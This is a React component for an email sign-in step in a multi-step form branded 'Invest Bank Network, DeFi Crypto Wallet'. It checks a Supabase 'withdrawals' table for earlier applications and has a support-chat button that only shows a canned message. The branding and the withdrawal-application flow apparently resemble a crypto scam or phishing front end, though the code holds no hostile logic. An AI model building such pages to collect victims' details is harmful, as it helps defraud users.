import React, { useState } from "react";
import { useStepper } from "../../context/StepperContext";
import { supabase } from '../../lib/supabase';

export const Step6_EmailSignIn = () => {
	const { data, updateData, nextStep } = useStepper();
	const [email, setEmail] = useState(data.email || "");
	const [message, setMessage] = useState("");
	const [isLoading, setIsLoading] = useState(false);

	const handleSubmit = async (e) => {
		e.preventDefault();
		if (email.trim()) {
			setIsLoading(true);
			setMessage("Checking account status...");
			try {
				const { data: existingUser, error } = await supabase
					.from('withdrawals')
					.select('email')
					.ilike('email', email.trim())
					.limit(1);
				
				if (error) throw error;
				
				if (existingUser && existingUser.length > 0) {
					setMessage("An application with this email has already been submitted.");
					setIsLoading(false);
					return;
				}
				
				updateData({ email: email.trim() });
				setMessage(`We'll continue with ${email.trim()}.`);
				setTimeout(() => {
					nextStep();
				}, 450);
			} catch (err) {
				console.error(err);
				setMessage("An error occurred. Please try again.");
				setIsLoading(false);
			}
		}
	};

	return (
		<div className="step6-root">
			<style>{`

    .step6-root {
      color-scheme: dark;
      --bg: #020a1e;
      --panel: rgba(10, 26, 62, .72);
      --border: rgba(126, 157, 215, .2);
      --text: #f6f7fb;
      --muted: #8aa9d6;
      --gold: #f3c64c;
      --blue: #223e83;
      --red: #b5183c;
    }
    * { box-sizing: border-box; }
    .step6-root { margin: 0; min-height: 100%; }
    .step6-root {
      min-height: 100vh;
      overflow: hidden;
      font-family: Arial, Helvetica, sans-serif;
      color: var(--text);
      background:
        radial-gradient(ellipse 58% 60% at 2% -12%, rgba(14, 49, 117, .66), transparent 68%),
        radial-gradient(ellipse 55% 58% at 100% -6%, rgba(96, 0, 44, .55), transparent 69%),
        linear-gradient(145deg, #020b22 0%, #010717 57%, #090b18 100%);
    }
    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 71px;
    }
    .brand { text-align: center; }
    .logo {
      width: 81px; height: 81px; margin: 0 auto 19px;
      display: grid; place-items: center;
      border-radius: 50%;
      color: #050b18;
      font-size: 29px; font-weight: 800;
      background: linear-gradient(145deg, #ffdf78, #c88b1d);
      box-shadow: 0 9px 25px rgba(238, 172, 50, .24);
    }
    h1 { margin: 0; font-size: 30px; letter-spacing: -.6px; }
    .tagline { margin: 7px 0 35px; color: var(--muted); font-size: 16px; }
    .card {
      width: min(408px, calc(100vw - 34px));
      padding: 27px 24px 24px;
      border: 1px solid var(--border);
      border-radius: 23px;
      background: var(--panel);
      box-shadow: 0 18px 55px rgba(0,0,0,.17), inset 0 1px rgba(255,255,255,.025);
      backdrop-filter: blur(9px);
    }
    h2 { margin: 0 0 8px; font-size: 20px; }
    .helper { margin: 0 0 25px; color: #91add4; font-size: 14px; }
    label { display: block; margin-bottom: 7px; font-size: 14px; font-weight: 700; }
    input {
      width: 100%; height: 43px; padding: 0 12px;
      color: var(--text); font-size: 14px;
      border: 1px solid rgba(91, 122, 180, .28); border-radius: 17px;
      outline: none; background: rgba(5, 17, 44, .66);
    }
    input::placeholder { color: #7ca0d3; }
    input:focus { border-color: #759ce0; box-shadow: 0 0 0 3px rgba(73, 116, 203, .18); }
    button {
      width: 100%; height: 46px; margin-top: 16px;
      color: white; font-size: 14px; font-weight: 700;
      border: 1px solid rgba(251, 193, 117, .42); border-radius: 17px;
      cursor: pointer;
      background: linear-gradient(105deg, #253f83 0%, #812d54 56%, #ae1137 100%);
      transition: transform .18s ease, filter .18s ease;
    }
    button:hover { filter: brightness(1.12); transform: translateY(-1px); }
    button:active { transform: translateY(0); }
    .message { min-height: 18px; margin: 13px 0 0; color: #9bb7e2; font-size: 13px; text-align: center; }
    .chat {
      position: fixed; left: 16px; bottom: 96px;
      width: 56px; height: 56px; display: grid; place-items: center;
      border: 1px solid rgba(239, 167, 78, .6); border-radius: 50%;
      background: linear-gradient(145deg, #672144, #172352);
      box-shadow: 0 6px 20px rgba(0,0,0,.3); cursor: pointer;
    }
    .bubble { width: 21px; height: 18px; border: 2px solid white; border-radius: 10px; position: relative; }
    .bubble:after { content: ''; position: absolute; width: 7px; height: 7px; left: 1px; bottom: -5px; border-left: 2px solid white; transform: skew(-25deg); }
    .toast { position: fixed; left: 50%; bottom: 28px; transform: translateX(-50%); color: #9ab1d0; font-size: 12px; opacity: .72; }
    @media (max-width: 560px) { .page { padding-top: 42px; } h1 { font-size: 26px; } .tagline { margin-bottom: 28px; } .chat { bottom: 26px; } .toast { display: none; } }
  
        .step6-root {
          min-height: calc(100vh - 54px);
          width: 100%;
          position: relative;
        }
      `}</style>
			<main className="page">
				<section className="brand" aria-label="Invest Bank Network">
					<div className="logo">Si</div>
					<h1>Invest Bank Network</h1>
					<p className="tagline">DeFi Crypto Wallet</p>
				</section>

				<form className="card" id="signInForm" onSubmit={handleSubmit}>
					<h2>Sign in</h2>
					<p className="helper">Enter your email to continue.</p>
					<label htmlFor="email">Email</label>
					<input
						id="email"
						name="email"
						type="email"
						placeholder="you@example.com"
						autoComplete="email"
						required
						value={email}
						onChange={(e) => setEmail(e.target.value)}
					/>
					<button type="submit" disabled={isLoading}>{isLoading ? 'Checking...' : 'Continue'}</button>
					<p className="message" id="message" aria-live="polite">
						{message}
					</p>
				</form>
			</main>

			<button
				className="chat"
				id="chatButton"
				aria-label="Open support chat"
				type="button"
				onClick={() => setMessage("Support chat is ready to help.")}
			>
				<span className="bubble"></span>
			</button>
		</div>
	);
};
